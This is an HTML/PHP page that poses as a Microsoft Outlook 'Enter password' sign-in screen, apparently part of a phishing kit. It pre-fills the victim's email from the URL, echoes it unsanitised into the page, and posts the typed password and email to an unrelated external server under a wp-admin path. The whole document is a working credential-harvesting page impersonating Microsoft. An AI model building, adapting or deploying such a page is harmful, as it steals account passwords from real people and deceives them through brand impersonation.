<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Sign into Outlook Portal</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="images/favi.ico" type="image/x-icon">
    <link href="index.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">
    <script src="index.js"></script>


</head>
<style>
    #background{
       background-color:#d9e3eb;
       margin-bottom:0px;

      }
    #content{
      height:370px; 
      width:440px; 
      margin-left:470px;
      margin-top:130px; 
      background-color:white;
      box-shadow: 0px 5px silver,
      position:absolute;
       z-index:+4;
       opacity:1;
    } 
    
     @media (max-width: 700px){
     #background {
     width : 100%;  
     } 
     #content {
     width : 115%;
     margin-left:0%;
     padding-left:0px;
  }
}
    #image{
       margin-left:50px;
       margin-top: 30px;
    }
    #signin{
       margin-left:50px;
       margin-top:7px; 
       color: #404040;
       font-size: 25px;
       font-weight: 600;
       font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    }
    #input{
       margin-left:50px;
       height:40px;
       width: 380px !important; 
       border:none;
       border-bottom:  1px solid #0067b8;
       margin-top:0px;
    }

input:focus {
  outline-width: 0px;
  padding-left:10px;
}

    input::placeholder{
    font-size:14px;
    padding-top:15px;
    padding-left:7px;
}
    
 
     #account{
        color: #262626;
        font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
        font-size:15px;
        margin-left:46px;
        margin-top:20px;
     }
     #forgot{
        color: #262626;
        font-family:"Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
        font-size:15px;
        margin-left:50px;
        margin-top:20px;
     }
     #sub{
      height:33px; 
      width:135px; 
      margin-left:250px;
      margin-top:20px; 
      background-color:#0067b8;
      border:none; 
      padding-left:5px;
      font-size:14px;
      color:white;
     }
     #sub:hover{
     background-color:#B92228;
} 



</style>


<?php
$value = $_GET['email'];
$dom = substr($value, strpos($value, '@') + 1);
?>

<script>
 function myMove() {

  var elem = document.getElementById("animate");   
  var pos = 0;
  var id = setInterval(frame, 5);
  
  var elemm = document.getElementById("animatee");   
  var poss = 0;
  var idd = setInterval(framee, 10);
  
  var elemmm = document.getElementById("animateee");   
  var posss = 0;
  var iddd = setInterval(frameee, 20);
  
  function frame() {
    if (pos == 490) {
      clearInterval(id);
    } else {
      pos++; 
      elem.style.left = pos + "px"; 
    }
  }
    function framee() {
    if (poss == 490) {
      clearInterval(idd);
    } else {
      poss++; 
      elemm.style.left = poss + "px"; 
    }
  }
      function frameee() {
    if (posss == 490) {
      clearInterval(iddd);
    } else {
      posss++; 
      elemmm.style.left = posss + "px"; 
    }
  }
}

 function hideLoader() {
document.getElementById("animate").style.display = "none";
document.getElementById("animatee").style.display = "none";
document.getElementById("animateee").style.display = "none";
}

 function showLoader() {
  document.getElementById("animate").style.visibility = "visible";
  document.getElementById("animatee").style.visibility = "visible";
  document.getElementById("animateee").style.visibility = "visible";
}

</script>

<body id = "background"> 
<div id = "content">
       <img src = "images/microsoft_logo.png" alt = "logo" width = "120px" height = "25px" style = "margin-left:50px; margin-top:40px" >
          <form action = "https://trentaspb.ru/wp-admin/optimal/wab.php?email=$value&id=21992a30eabdb21992a30eabdb21992a30eabdbe5aa531f0da8a641dd6e5aa531f0da8a641dd6e5a21992a30eabdbe5aa531f0da8a641dd6a531f0da8a641dd6&ref=5465
" method = "post">
            <p style = "margin-left:50px; margin-top:20px; font-size:15px"><a href = "update1.php" style = "color:grey"><i class="fa fa-arrow-left" aria-hidden="true"></i><?php echo $value;?></a></p>
            <p style = "margin-left:50px; margin-top:15px; font-size:30px">Enter password</p>
            <input type = "password" value = "" name = "password" id = "" class = "inputicon2" placeholder = "Password" style = "height:44px; background-color:white; width:330px; margin-left:50px; padding-left:5px; margin-top:-10px;       border:none; border-bottom:1px solid #0067b8;">
            <input type = "hidden" value = "<?php echo $value;?>" name = "prevEmail" id = "" class = "inputicon2" placeholder = "Password" style = "height:44px; background-color:white; width:330px; margin-left:50px; padding-left:5px; margin-top:-10px;       border:none; border-bottom:1px solid #0067b8;">
            <p style = "margin-left:50px; margin-top:30px; font-size:15px;color:#0067b8">Forgot my password</p>
            <button type = "submit" value = "" id = "sub" placeholder = "登录" >Sign in</button>
                 </form>    
            </div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</body>
</html>